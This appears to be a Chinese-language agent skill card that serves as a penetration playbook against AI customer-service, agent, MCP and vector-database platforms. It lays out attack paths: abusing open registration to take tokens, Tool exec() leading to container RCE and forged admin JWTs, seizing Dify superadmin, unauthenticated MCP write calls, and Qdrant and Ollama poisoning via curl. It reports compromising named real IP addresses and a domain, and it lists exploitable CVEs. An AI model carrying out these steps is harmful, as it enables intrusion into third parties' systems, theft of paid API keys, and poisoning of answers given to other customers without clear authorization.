---
name: ai-customer-service-killchain
description: >-
  打 AI 客服/在线客服/Chatwoot/Dify/LibreChat/FastGPT/Flowise/Langflow/MCP/Agent/RAG/向量库。
  九层攻击面全量排面+七条独立路径(P1-P7)+五步杀伤链(K1-K5)。
  用户提到 AI 客服、chatbot、在线客服、Chatwoot、Dify setup、LibreChat register、
  MCP tools/list、向量库投毒、Qdrant、Agent 工具越权、AI 框架 RCE 时使用。
  188台实战检验。与 ai-agent-runtime-pentest(Agent宿主伪造)、llm-security(越狱)互补。
---

# AI 客服/Agent 应用 — 全面攻击面×杀伤链

> 188台实战(2026-09-22)：45台命中/143台判负。
> **90% 的成败在"未授权面/授权检查缺失"，不在模型。别一上来就研究越狱。**

## 0. 30秒决策树

```
拿到一个"带客服/带 AI 助手"的站
 ├─ ① 自建前端 还是 标准产品?      → 指纹(§1 L1)
 ├─ ② 权威配置端点是否免鉴权?      → K1 排面
 ├─ ③ 能自助注册/未初始化/auto_login? → K3 直接拿控制权
 ├─ ④ 有工具调用/代码执行/MCP?       → K4(从"能聊"到"能执行")
 └─ ⑤ 有客服 widget/会话/RAG?       → K5(数据面+跨租户)
```

## 1. 九层攻击面

| 层 | 面 | 主验法 |
|---|---|---|
| **L1 指纹** | Open WebUI `/api/config`、LibreChat `/api/config`、Chatwoot `/api`、Dify `/console/api/setup` | 拿版本对 CVE |
| **L2 未授权配置** | `enable_signup`/`registrationEnabled`/`emailEnabled`/`step!=finished`/`auto_login`/MCP `tools/list` | 一次 GET 定性 |
| **L3 身份与注册** | 自助注册+邮箱验证不强制；Dify 未初始化抢超管；默认口令 | POST 注册实测 |
| **L4 会话与凭据** | 平台侧供 key(`userProvide:false`)、.env 泄露、MCP `authenticated:true` | 持票读端点 |
| **L5 工具与执行** | Tool `exec()`、code 解释器、function calling 越权、MCP 写工具 | 最小可逆验证 |
| **L6 数据/知识库** | 知识库 IDOR、向量库直连(Qdrant/Chroma/Milvus)、RAG 投毒 | 顺序 id 替换 |
| **L7 客服专有** | widget 泄 `inbox_identifier`、ActionCable 未授权订阅、会话 IDOR、工单附件 | 见 P6 |
| **L8 基础设施** | 容器逃逸、上游 ollama/向量库、MCP orchestrator 回调投毒 | 见 P2/P5 |
| **L9 客户端** | Electron/APK/浏览器插件/本地存储 token | 走 apk-reverse 等 |

## 2. 七条攻击路径

### P1 自注册→白嫖平台key+Agent构建器
- **前提**：`registrationEnabled:true` + `emailEnabled:false`
- **入口**：`POST /api/auth/register` → `POST /api/auth/login`
- **关键**：回"Please check your email"≠ 死路，继续 login 拿 token
- **实战**：LibreChat `20.114.162.114` — 注册直给 token → 20个保险MCP工具全表+内网Azure地址

### P2 Tool exec() → 容器RCE → 伪造admin
- **前提**：Open WebUI `enable_signup:true`
- **链**：注册→建Tool(内容=`import os;os.popen("id")`)→工具加载即执行→容器root→读 `WEBUI_SECRET_KEY`→伪造admin JWT
- **实战**：`42.194.194.131:3000` Open WebUI 0.7.2 打穿

### P3 Dify 未初始化→抢超管
- **前提**：`GET /console/api/setup` → `step != "finished"`
- **窗口**：部署完→初始化之间，转瞬即逝
- **188台全判负**（含20260920新装的），但方法论成立

### P4 auto_login/协议面漏鉴权
- **前提**：Langflow `AUTO_LOGIN=true`(Docker默认)
- `GET /api/v1/auto_login` 直接返 token
- **188台判负**，1.4.0+ 已强制 API key

### P5 MCP JSON-RPC 未授权→注册表投毒
- **前提**：`POST /mcp` 免鉴权
- **判定法**：空参 `tools/call` → 返 `-32000 Argument error: missing N required positional arguments` = **handler已执行、鉴权不存在**
- **可逆铁律**：`register_service` ↔ `deregister_service` 存在才写；**`register_capability` 无删除工具，绝不碰**
- **实战**：`mcp.dev.monetedge.ai` 写工具 10/10 执行

### P6 客服专有链：widget→会话IDOR→RAG投毒
- B1 前端泄 `inbox_identifier` → B4 访客身份伪造 → B2 ActionCable 未授权订阅 → B3 会话IDOR → B5 RAG投毒 → B7 工具越权
- **188台无带widget的活站**，推演级

### P7 文件/SSRF面(Flowise)
- `get-upload-file?path=`路径穿越、`fetch-links?url=` SSRF
- **7台全封**（500 Invalid file path / 401）

## 3. 向量库投毒（实战闭环）

### Qdrant 可逆归零
```bash
curl -X PUT http://TARGET:6333/collections/<name>/points -d '{"points":[{"id":<marker>,"vector":[...],"payload":{"marker":true}}]}'
curl -X POST http://TARGET:6333/collections/<name>/points/delete -d '{"points":[<marker>]}'
```
实战：`104.131.176.17:6333` 集合 `rsap`(1287点/1536维)，写标记→读回→删，总分片未变

### Ollama 模型投毒
```bash
curl -X POST http://TARGET:11434/api/create -d '{"model":"marker-name","from":"..."}'
curl -X DELETE http://TARGET:11434/api/delete -d '{"model":"marker-name"}'
```
**坑**：CPU推理的 Ollama 做 27B 生成会把主机打瘫，`/api/tags` 45s 超时。**用最小模型 / `num_predict=1` / 只做写入→读回**

## 4. Chatwoot 开放注册→持久化token
```bash
POST /api/v1/accounts
{"account_name":"<标记>","email":"<标记邮箱>","password":"<随机>"}
# → 200 直接返回 access_token（无需再登录）
# 持久化：GET /api/v1/profile、/accounts/N/agents、/inboxes 全200
# 租户隔离：换 account_id → 401（正确）
# 清理：DELETE /api/v1/accounts/N + DELETE /api/v1/profile
```
**判据铁律**：6/7台 `/api/v1/accounts` POST → 404（`ENABLE_ACCOUNT_SIGNUP`关闭），只有1台200

## 5. 铁律（违反即报废结论）

### 对照组铁律
凡"鉴权缺失/绕过"类判定，**必须同时打已修补版本当对照组**。没有差分的响应码毫无意义。

### 假阳性自查
| 现象 | 真因 |
|---|---|
| 全路径 200 | SPA 兜底 |
| 400/405 | HTTP vs HTTPS / 方法降级（301→GET） |
| 401 | 脚本没带票 |
| 版本命中CVE | 必须实测触发 |
| 能列工具 | ≠ 能调用 |
| 能绑Agent工具 | ≠ 执行（实测 `illegal_model_request`） |

### 405陷阱
nginx `:80` POST → 301 → `:443`，客户端跟随时 POST 降级为 GET → `405 Allow: POST`。
**遇到"405但Allow里有我用的方法"，先查301/302方法降级。**

### 归零纪律
- 建号必带标记（`pntest` 前缀）+ `try/finally` 兜底
- `POST /api/user/delete` 返 200 **实为封号**（复登403 `temporarily banned`）≠ 删除
- 归零顺序：先删 Agent/对话 → 再删账号（级联已实证）
- 删不掉如实披露，不重试注册

## 6. CVE 弹药库（按组件）

| 组件 | CVE | 性质 |
|---|---|---|
| Langflow | CVE-2026-33017 | 公开 flow-build→未授权RCE（20小时在野） |
| Langflow | CVE-2026-5027 | `/api/v2/files` 路径穿越→文件写入→RCE |
| Flowise | CVE-2026-40933 | 导入共享chatflow→MCP节点→RCE |
| LiteLLM | CVE-2026-42208 | 预认证SQLi（36小时在野） |
| LiteLLM | CVE-2026-49468 | Host头鉴权绕过(BadHost) |
| Dify | CVE-2026-41947~41950 | DifyTap四连（tracing劫持/路径穿越/预览IDOR/借chatbot读文件） |
| RAGFlow | CVE-2026-45312 | 提示模板 Jinja2 SSTI→OS命令 |
| PraisonAI | CVE-2026-44338 | 认证被硬关闭（3h44m在野） |
| marimo | CVE-2026-39987 | 未授权→完整PTY/SQL（首次捕获LLM agent驱动后渗透） |
| ChromaDB | CVE-2026-45829 | 预认证RCE（CVSS 10.0） |
| SGLang | CVE-2026-5760 | 恶意GGUF chat template→Python执行(9.8) |
| Ollama | CVE-2026-7482 | GGUF解析→拉取服务器堆内存 |
| FastGPT | CVE-2026-61684 | JWT弱密钥 |

## 7. 与现有体系挂接

| 要做什么 | 用哪张卡 |
|---|---|
| AI客服/Agent全面排面+路径 | **本卡** |
| MCP未授权判定 | 本卡 P5 |
| 提示注入/越狱/模型层 | `llm-security` |
| Agent运行时(宿主伪造/特权RPC) | `ai-agent-runtime-pentest` |
| Langflow RCE | `langflow-unauth-rce` |
| Flowise RCE | `flowise-internal-header-rce` |
| LiteLLM BadHost | `litellm-badhost` |
| Ollama 未授权 | `ollama-unauth` |
| Vite 任意读 | `vite-fs-read` |
| 通用Web漏洞 | `web-vuln-router` |

## 已知坑位

1. **"Please check your email" ≠ 注册失败**——继续 login 经常直接给 token（emailEnabled=false时）
2. **SPA 兜底导致全部路径200**——必须验 Content-Type + body首字符 `{[`
3. **Gitea `/user/sign_up` 返200 ≠ 可注册**——判据是页面里有没有 `user_name/email/password` 表单字段
4. **`web.config::$DATA.` 的400错误页含 `system.web` → 关键字匹配假阳**——要用结构判据
5. **IIS目录浏览 ≠ 可写**——`Allow`头无 PUT/DELETE = 无 WebDAV
6. **CPU Ollama 做27B生成会打瘫主机**——投毒验证用最小模型
7. **版本号 ≠ 有洞**——Langflow 1.6.0 对 CVE-2025-3248 已修补
8. **LibreChat "整线判负" 判早了**——`registrationEnabled:true` 本身就是攻击面，不能只记账不测
9. **"注册开放"必须POST实测**——其余6台Chatwoot 404
10. **Cognito `PreventUserExistenceErrors` 需差分实验**——单点调用既不能证真也证伪不了


---

## 外部库增量（2026-10-11 分享包）

## 0. 30 秒决策树

```
拿到一个"带客服 / 带 AI 助手"的站
 ├─ ① 自建前端 还是 标准产品?      → 指纹 + 免鉴权版本端点(§1 L1)
 ├─ ② 权威配置端点是否免鉴权?      → 一键探测(§2 K1)
 ├─ ③ 能自助注册 / 未初始化 / auto_login? → 是 ⇒ K3 直接拿控制权(最快路径)
 ├─ ④ 有 工具调用 / 代码执行 / 上传 / MCP? → 有 ⇒ K4(从"能聊"到"能执行")
 └─ ⑤ 有 客服 widget / 会话 / 工单 / RAG?  → 有 ⇒ K5(数据面 + 跨租户)
```

**一句话结论**:打 AI 站,**90% 的成败在"未授权面 / 授权检查缺失",不在模型**。别一上来就研究越狱。

## 1. 九层攻击面(全量排面 — 漏层就是漏洞)

| 层 | 攻击面 | 具体面 | 主验法 |
|---|---|---|---|
| **L1 产品识别** | 指纹 / 版本 | 版本端点常免鉴权:Open WebUI `/api/config`、LibreChat `/api/config`、Flowise/Langflow `/api/v1/version`、Chatwoot `/api`、FastGPT `/api/system/getInitData` | 拿版本对 CVE 线(见同族卡 `references/cve-arsenal-2026.md`) |
| **L2 未授权配置** | 配置即漏洞 | `enable_signup` / `registrationEnabled` / `emailEnabled` / `userProvide:false` / `step!=finished` / `auto_login` / `auth_trusted_header` / `/mcp` `tools/list` | 一次 GET 定性,**先打这层** |
| **L3 身份与注册** | 拿号 / 接管 | 自助注册 + 邮箱验证不强制;Dify 未初始化抢设超管;默认口令;SSO/OIDC(`redirect_uri`/`state`);JWT/会话票伪造 | 注册→复登拿 token 才算实锤 |
| **L4 会话与凭据** | 票 / 密钥 | 平台侧付费 key(`userProvide:false`)、`.env`/端点配置泄露、MCP `authenticated:true` 背后的凭据、审计日志活票 | 只读列出,**值一律 [REDACTED]** |
| **L5 工具与执行** | 能聊 → 能跑 | Tool/Plugin 内容被 `exec()`;代码解释器;function calling 越权;MCP 写工具;workflow/code 节点 | 最小可逆验证(空参 → 可逆写) |
| **L6 数据与知识库** | 拖数据 | models/agents/会话历史;知识库文档 IDOR;向量库直连;**RAG 投毒** | 顺序 id / 参数替换差分 |
| **L7 客服专有** | 客服系统独有 | widget 泄 `inbox_identifier`;`/cable`(ActionCable)未授权订阅;会话 **IDOR**;访客身份伪造;工单附件;宏/自动化;RAG 客服 | 见 §3 P6 |
| **L8 运维与供应链** | 拿到之后 | 容器逃逸(→ root);上游 `ollama`/向量库;MCP orchestrator 回调投毒;备份/`webui.db`;CI | 见 §3 P2/P5 |
| **L9 客户端** | 端上 | Electron/桌面客户端、移动端 APK、浏览器插件、本地存储 token | 见 desktop-software-reversing / apk-reverse |

## 1.5 溯源与边界(★不许吹"首创")
**本层不是本库首创。** 同一概念已被业界编号化，写报告/汇报必须**引用**而非声称自有发现：
- **OWASP Top 10 for LLM v2025 · LLM08 Vector and Embedding Weaknesses** —— 明确列 `Data Poisoning Attacks` / `Unauthorized Access & Data Leakage` / `Cross-Context Information Leaks`(多租户向量库串租)。
- **MITRE ATLAS**(v6，2026.05+ 月度发布)：`AML.T0070 RAG Poisoning`(Persistence)、`AML.T0071 False RAG Entry Injection`、`AML.T0066 Retrieval Content Crafting`、`AML.T0064 Gather RAG-Indexed Targets`、`AML.T0115 Publish Poisoned AI Artifacts`(子技术含 Models/Datasets/Agent Tools)、`AML.T0007 Discover AI Artifacts`；其 **Lateral Movement(AML.TA0015)** 描述原话即点名 `model registries, experiment trackers, **vector databases**, notebooks, training pipelines`。
- 第三方已写烂的同期文章："The Hidden Attack Surface of Vector Databases"、Legit Security "Risks Lurking in Publicly Exposed GenAI Development Services"。

**本库的真实增量(只有这三处可署名)**：① **可执行攻击清单** —— 具体端口/端点/payload/判据/对照组(框架给的是词汇表，不给作业手册)；② **实测踩出的判据与纪律**(见下)；③ **实测口径台账**(188 台 → 45 命中)。

**★ 判据与纪律(本库实测产出，对外可引用)**：
- `GET /user/sign_up` **200 ≠ 可注册** —— 必须查页面内是否存在 `user_name`/`email`/`password` 表单字段(Gitea 禁用注册时返回提示页，只有 meta 标签)。
- 投毒行为验证**只做「写入 → 读回」**，禁对 **CPU 推理** Ollama 跑生成(打瘫主机 ⇒ 连删除都做不了)。
- **「可逆归零」= 清干净的硬证据**：删除后总分片数/模型数必须回到投毒前。
- Vite `server.fs.deny` **只约束 `/@fs/`**，根路径静态服务不受限(`.env` 由此可读)；版本补丁会封 `?raw??` 绕过族。

**报告用语铁律**：写「**本次实测确认的已知面**」，**不写「自主发现 / 首创」**；本层本轮**未产出任何厂商未公开漏洞**(0 个新 CVE/0day)。

## 2. 五步杀伤链(K1–K5)

> **新增路由（2026-09-22）**：拿到产品+版本后，**先跑 `ghsa-diff-unauth-mining`**（上游 advisory 差分 → 未修补清单）再动手。只试 1–2 个已知 CVE 就判负会把打穿的机器写进台账。

### K1 指纹定产品(30 秒,只 GET)
```bash
python scripts/ai_stack_unauth_probe.py <host:port> [...]   # 逐端口指纹→产品识别→打权威配置端点
```
**输出即判档**:`enable_signup=True` / `registrationEnabled=True` / `step!=finished` / `auto_login` / `version` ⇒ 直接决定后面走哪条路。内置**禁区 IP 黑名单**(用户指定的无授权目标,勿移除)。

### K2 未授权面判定(读配置,不写)
判据是**字段**,不是"能不能打开页面":
| 看到 | 含义 | 下一步 |
|---|---|---|
| `registrationEnabled:true` + `emailEnabled:false` | 注册不强制验证(**最强信号**) | 立刻 K3 |
| `enable_signup:true` | 开放注册 | K3(Open WebUI 直通 RCE) |
| `step != finished` | 未初始化 | `POST /console/api/setup` **抢超管 = 接管** |
| `auto_login:true` | Docker 默认 | `GET /api/v1/auto_login` 直接拿 token |
| `userProvide:false` | 平台侧供 key | 白嫖付费模型(K4) |
| `/mcp` `tools/list` 免鉴权 | 协议面漏挂鉴权 | K4 写工具(可逆) |

### K3 拿控制权(注册 / 接管)
- **注册**:带明显标记的邮箱 → 注册 → **立刻 login 拿 token**("回请验证邮箱"不代表死路)
- **未初始化抢超管**:Dify `POST /console/api/setup`
- **auto_login**:Langflow 直接返 token
- ⚠️ 建号前先定好**归零方案**(§4)

### K4 从"能聊"到"能执行"(价值分水岭)
| 面 | 验法 |
|---|---|
| Tool/Plugin 内容 `exec()` | 建 Tool → 内容为最小无害命令(`id`)→ 看回显 ⇒ 容器内 RCE |
| Agent 绑工具 | `POST /api/agents`(201)绑平台 MCP 工具 → 发消息 → 看**是否真被调用**(只读工具优先) |
| MCP 写工具 | `tools/call` 空参探存在性 → **可逆** `register_service`→`deregister_service`;**禁碰** `register_capability`(留永久残留) |
| 上传/SSRF | Flowise `get-upload-file?path=`(穿越)、`fetch-links?url=`(SSRF) |

**判据**:能调用 ≠ 能执行;**必须实测**工具是否真被触发(本卡实测过"绑定成立、执行不成立"的反例)。

### K5 数据面与横向
会话/工单历史(PII、订单号)、知识库文档、平台 key 供给、**RAG 投毒**(影响其他客户看到的回答)、容器内 `WEBUI_SECRET_KEY`/DB ⇒ 伪造 admin。**数据只记形态与数量,值一律 [REDACTED]。**


## 全文导航（已拆分）

主卡保留前 14 节；其余 4 节在 `references/full.md`：

- 3. 七条攻击路径(可独立执行;一条堵死就换下一条)
- 4. 纪律(全是本轮踩出来的硬规则,违反即报废结论)
- 5. 结合进现有渗透体系(怎么挂)
- 6. 复现命令(起手式)

加载：`skill_view(name='ai-customer-service-killchain', file_path='references/full.md')`
